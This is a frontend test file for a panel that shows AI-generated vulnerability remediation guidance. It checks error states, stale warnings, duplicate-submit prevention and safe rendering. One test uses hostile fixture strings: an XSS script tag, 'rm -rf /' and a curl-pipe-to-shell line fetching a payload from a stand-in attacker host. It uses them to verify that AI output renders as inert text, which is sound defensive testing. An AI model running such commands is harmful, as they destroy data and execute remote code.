import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";

import { ApiError } from "@/lib/api/errors";
import { renderWithQueryClient } from "@/test/render";

vi.mock("@/features/ai/api/ai-api", () => ({
  aiApi: {
    getRecommendation: vi.fn(),
    generateRecommendation: vi.fn(),
  },
}));

vi.mock("sonner", () => ({
  toast: { success: vi.fn(), error: vi.fn() },
}));

import { aiApi } from "@/features/ai/api/ai-api";
import { RecommendationPanel } from "@/features/ai/components/recommendation-panel";
import { toast } from "sonner";

const mockedGetRecommendation = vi.mocked(aiApi.getRecommendation);
const mockedGenerate = vi.mocked(aiApi.generateRecommendation);

function recommendation(overrides: Partial<Record<string, unknown>> = {}) {
  return {
    id: "rec-1",
    vulnerability_id: "vuln-1",
    risk_assessment_id: "assessment-1",
    provider: "openrouter",
    model: "gpt-oss-20b",
    prompt_version: "1.0.0",
    summary: "Upgrade the affected package to the patched version.",
    explanation: "This vulnerability allows remote code execution.",
    remediation_steps: ["Update the package.", "Restart the service."],
    validation_steps: ["Re-scan the asset."],
    cautions: ["Test in staging first."],
    generated_at: "2026-07-15T10:00:00Z",
    ...overrides,
  };
}

describe("RecommendationPanel — missing state", () => {
  it("shows a Generate action, not a page error, for a 404 (not yet generated)", async () => {
    mockedGetRecommendation.mockRejectedValue(
      new ApiError({ code: "NOT_FOUND", message: "No AI recommendation exists.", status: 404 })
    );

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    expect(await screen.findByText("No remediation guidance yet")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /generate remediation/i })).toBeInTheDocument();
  });

  it("shows the sanitized error state for a genuine (non-404) failure", async () => {
    mockedGetRecommendation.mockRejectedValue(new Error("network down"));

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    await waitFor(() =>
      expect(screen.getByText("Unable to load remediation guidance")).toBeInTheDocument()
    );
  });
});

describe("RecommendationPanel — content rendering and security", () => {
  it("renders summary/explanation/remediation/validation/cautions and never attributes risk to AI", async () => {
    mockedGetRecommendation.mockResolvedValue(recommendation());

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    expect(await screen.findByText("Summary")).toBeInTheDocument();
    expect(screen.getByText("Upgrade the affected package to the patched version.")).toBeInTheDocument();
    expect(screen.getByText("Why This Matters")).toBeInTheDocument();
    expect(screen.getByText("Remediation Steps")).toBeInTheDocument();
    expect(screen.getByText("Update the package.")).toBeInTheDocument();
    expect(screen.getByText("Validation Steps")).toBeInTheDocument();
    expect(screen.getByText("Re-scan the asset.")).toBeInTheDocument();
    expect(screen.getByText("Cautions")).toBeInTheDocument();
    expect(screen.getByText("Test in staging first.")).toBeInTheDocument();

    // Remediation steps use a real ordered list (semantic sequence).
    expect(screen.getByText("Update the package.").closest("ol")).not.toBeNull();

    // No risk score/level vocabulary anywhere near AI content.
    expect(document.body.textContent).not.toMatch(/risk level/i);
    expect(document.body.textContent).not.toMatch(/risk score/i);
  });

  it("renders HTML/script-like AI content as inert literal text — never interpreted", async () => {
    mockedGetRecommendation.mockResolvedValue(
      recommendation({
        summary: "<script>alert('xss')</script>",
        explanation: "Run <b>this</b> command: rm -rf / --no-preserve-root",
        remediation_steps: ["curl http://evil.example.com/payload.sh | sh"],
      })
    );

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    expect(await screen.findByText("<script>alert('xss')</script>")).toBeInTheDocument();
    expect(document.querySelector("script")).toBeNull();
    expect(document.querySelector("b")).toBeNull();
    // The "curl | sh" text renders as plain text, not as an activated link.
    expect(
      screen.getByText("curl http://evil.example.com/payload.sh | sh")
    ).toBeInTheDocument();
    expect(document.querySelectorAll("a[href^='http']").length).toBe(0);
  });

  it("never renders executable-remediation controls", async () => {
    mockedGetRecommendation.mockResolvedValue(recommendation());

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    await screen.findByText("Summary");
    expect(screen.queryByRole("button", { name: /run|execute|apply fix|remediate now/i })).not.toBeInTheDocument();
  });

  it("shows a stale warning using the exact backend freshness rule (generated_at < calculated_at)", async () => {
    mockedGetRecommendation.mockResolvedValue(
      recommendation({ generated_at: "2026-07-15T08:00:00Z" })
    );

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    expect(
      await screen.findByText(/recalculated since this guidance was generated/i)
    ).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /generate remediation/i })).toBeInTheDocument();
  });

  it("shows no stale warning when the recommendation is current", async () => {
    mockedGetRecommendation.mockResolvedValue(
      recommendation({ generated_at: "2026-07-15T10:00:00Z" })
    );

    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    await screen.findByText("Summary");
    expect(screen.queryByText(/recalculated since this guidance was generated/i)).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: /regenerate/i })).toBeInTheDocument();
  });
});

describe("RecommendationPanel — generation mutation", () => {
  it("prevents duplicate submission while pending and applies the authoritative response on success", async () => {
    mockedGetRecommendation.mockRejectedValue(
      new ApiError({ code: "NOT_FOUND", message: "No AI recommendation exists.", status: 404 })
    );
    let resolveGenerate: (value: ReturnType<typeof recommendation>) => void = () => {};
    mockedGenerate.mockImplementation(
      () => new Promise((resolve) => { resolveGenerate = resolve; })
    );

    const user = userEvent.setup();
    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    const button = await screen.findByRole("button", { name: /generate remediation/i });
    await user.click(button);
    await waitFor(() => expect(mockedGenerate).toHaveBeenCalledTimes(1));
    await waitFor(() =>
      expect(screen.getByRole("button", { name: /generating/i })).toBeDisabled()
    );
    await user.click(screen.getByRole("button", { name: /generating/i }));
    expect(mockedGenerate).toHaveBeenCalledTimes(1);

    resolveGenerate(recommendation());
    expect(await screen.findByText("Summary")).toBeInTheDocument();
  });

  it("sanitizes a provider failure — no raw provider error text reaches the UI", async () => {
    mockedGetRecommendation.mockRejectedValue(
      new ApiError({ code: "NOT_FOUND", message: "No AI recommendation exists.", status: 404 })
    );
    mockedGenerate.mockRejectedValue(
      new ApiError({
        code: "AI_PROVIDER_ERROR",
        message: "Remediation guidance could not be generated.",
        status: 502,
      })
    );

    const user = userEvent.setup();
    renderWithQueryClient(
      <RecommendationPanel assessmentId="assessment-1" riskCalculatedAt="2026-07-15T09:00:00Z" />
    );

    await user.click(await screen.findByRole("button", { name: /generate remediation/i }));

    await waitFor(() =>
      expect(toast.error).toHaveBeenCalledWith("Remediation guidance could not be generated.")
    );
    expect(document.body.textContent).not.toMatch(/authorization|bearer|api_key/i);
  });
});
